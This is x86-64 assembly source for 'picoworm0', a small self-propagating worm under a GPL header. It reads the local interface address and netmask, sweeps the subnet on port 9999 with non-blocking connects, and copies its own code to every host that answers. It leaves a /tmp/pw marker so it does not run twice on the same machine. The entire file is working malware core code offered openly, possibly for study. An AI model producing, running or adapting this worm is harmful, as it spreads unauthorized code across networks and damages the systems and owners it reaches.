;;; 
;;;  *  picoworm0. Basic Worm without vulnerable service scaning
;;;  *  Copyright (c) 2023 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.


BITS 64
section .text
global _start
_start:
	;; Check for previous visits /tmp/pw
	lea  	rdi, [rel mark]
	;; nasm conditional for easy remove code during testing
	;; you can also use %else
%if 1   			
	
	mov  	rsi, 100o | 200o 	; O_CREAT | O_EXCL
	mov  	rdx, 700o		; S_IRWXU
	call 	_open
	test 	rax,rax
	jl   	pw_done		; On error (file already exists finish)
	mov  	rdi, rax		
	call 	_close	        ; Done with payload
%endif
	;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Get IP Address and mask and calculate base address for scan
	;; iface name is 16 bytes
	;; return union is 24 bytes (addr)
	;; We need a socket to get that information
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov   	rdi, 2		; PF_INET 2
	mov   	rsi, 1		; SOCK_STREAM
	mov   	rdx, 6          ; IPPROTO_TCP
	call  	_socket
	mov   	rdi, rax        ; Put it as fist parameter for next syscalls
	 
	mov   	rax, 0x000030687465    ; device name eth0
	mov   	[rbp - 0x30], rax      ; ifr.ifr_name
	mov   	BYTE [rbp - 0x20], 2   ; ifr.ifr_addr.sa_family
	mov   	rsi, 0x8915	       ; SIOCGIFADDR
	lea   	rdx, [rbp-0x30]        ; Results in the stack
	call  	_ioctl
	
	mov   	r12d, [rbp - 0x20 + 4] ; Store IP Address
	mov   	rsi, 0x891b	       ; SIOCGIFNETWORK
	call  	_ioctl
	
	mov   	r13d, [rbp - 0x20 + 4] ; Stores netmask
	call  	_close                 ; Close the socket used for ioctl
	
	and   	r12d, r13d             ; r12d contains the network address
	bswap 	r12d                   ; Keep network address in host representation
	                               ; so we can just add number to increase IP
	
	mov   	ax, 0x0f27             ; SNASE Port 9999 (0x270f)
	mov   	[rbp - 0x20 + 2], ax   ; Set port
	
	;; Calculate number of host to scan
	bswap 	r13d
	not   	r13d
		
	xor   	r9, r9		; IP Table counter
	inc   	r9b             ; start in 1
scan:
	;; Skip network and broadcast addresses. Add other exceptions here
	mov 	rdx, r9
	and 	rdx, 0xff
	cmp 	dx, 0xff
	je  	error
	cmp 	dx, 0
	je 	error

	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  	rdi, 2		; PF_INET 2
	mov  	rsi, 1		; SOCK_STREAM
	mov  	rdx, 6          ; IPPROTO_TCP
	call 	_socket	
 	mov  	rdi, rax       	; Just use the new created socket
	mov  	[rbp + 0x40], rdi
	
	;;  Set socket non blockinbg
	mov 	rsi, 4    		; F_SETFL
	mov 	rdx, 0x800          ; O_NONBLOCKING
	call 	_fcntl
	
	;; Calculate IP address to connect to
	mov   	r10d, r12d
	or    	r10d, r9d
	bswap 	r10d
	mov   	[rbp - 0x20 + 4], r10d ; Set up struct addr in memory
	
	;; Retry loop
	mov 	r14d, 4   	; Try connect 4 times -> 200 ms
	mov   	rdx, 16		; Set address size outside loop
try_connect:
	lea   	rsi, [rbp - 0x20]  
	call  	_connect	; RSI=s, RDI=addr RCX= addr size

	test 	eax, eax
	jns  	move            ; If value is > 0 got a connection. Let's move
	cmp 	eax, -115	;; EINPROGRESS 0x73
	jne 	error	  	; If operation not in progress... move to next host
	;;  Otherwise we wait 50 ms and we try again
	
	lea  	rdi, [rel delay]
	xor  	rsi, rsi
	call 	_nanosleep
	
	mov  	rdi, [rbp + 0x40] ; Restore socket for next calls
next_try:	
	dec  	r14d
	jnz  	try_connect
	jmp  	error
move:	
	;;  Otherwise move the code
	;;  RDI still contains the socket
	mov  	rsi, _start
	mov  	rdx, code_size
	call 	_write
error:
	call 	_close
	inc 	r9
	cmp 	r9, r13
	je  	pw_done
	jmp 	scan

;;; End of program
;;; ----------------------------------------------------
	
_write:
	xor 	eax,eax
	inc 	eax

	jmp 	_do_syscall
_open:
	mov 	eax, 02
	jmp 	_do_syscall
	
_socket:
	;; mov rax, 41
	xor 	eax,eax
	add 	al, 41
	jmp 	_do_syscall
	
_connect:
	;; 	mov rax, 42
	xor 	eax,eax
	add 	al, 42
	jmp 	_do_syscall
	
_close:
	;; mov rax, 3
	xor 	eax,eax
	add 	al, 3
	jmp 	_do_syscall
;;; New syscalls
_unlink:
	xor 	eax,eax
	add 	al, 87
	jmp 	_do_syscall
_ioctl:
	;; mov rax, 16
	xor 	eax, eax
	add 	al, 16
	jmp 	_do_syscall
_fcntl:
	xor 	eax, eax
	add 	al, 72
	jmp 	_do_syscall
_nanosleep:
	xor 	eax, eax
	add 	al, 35
	jmp 	_do_syscall
_getsockopt:
	xor 	eax, eax
	add 	al, 55
	jmp 	_do_syscall

pw_done:	
_exit:
	xor 	eax,eax
	add 	al, 60

_do_syscall:
	syscall
	ret

worm_data:	
	mark       db "/tmp/pw",0
	delay      dq 0
	delay_nsec dq 50000000
	
code_size equ $ - $$
